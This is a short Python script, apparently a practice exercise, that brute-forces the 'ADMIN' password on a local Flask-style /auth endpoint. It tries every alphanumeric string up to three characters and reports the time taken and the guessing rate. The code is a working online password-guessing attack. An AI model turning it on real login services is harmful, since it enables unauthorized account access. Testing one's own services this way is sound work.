import itertools
import time
import requests

def brute_force_password(password_length, characters):
    start_time = time.time()
    incPass = 0
    for length in range(1, password_length + 1):
        for guess in itertools.product(characters, repeat=length):
            password = ''.join(guess)
            print(f"Trying password: {password}")

            BASE_URL = 'http://localhost:5000/auth'
            user_data = {
                "username": "ADMIN",
                "password": password
            }

            try:
                response = requests.post(BASE_URL, json=user_data, verify=False)
                incPass+=1
            except Exception as e:
                print(e)

            if (response.status_code == 200):
                print(response.json())
                end_time = time.time()
                print(f"Password found: {password}")
                print(f"Time taken: {end_time - start_time} seconds")
                print(f"Password per Seconds: {incPass / (end_time - start_time)}")
                return password

            # if password == target_password:
            #     end_time = time.time()
            #     print(f"Password found: {password}")
            #     print(f"Time taken: {end_time - start_time} seconds")
            #     return password

# Пример использования
target_password = "a"
character_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
password_length = 3

brute_force_password(password_length, character_set)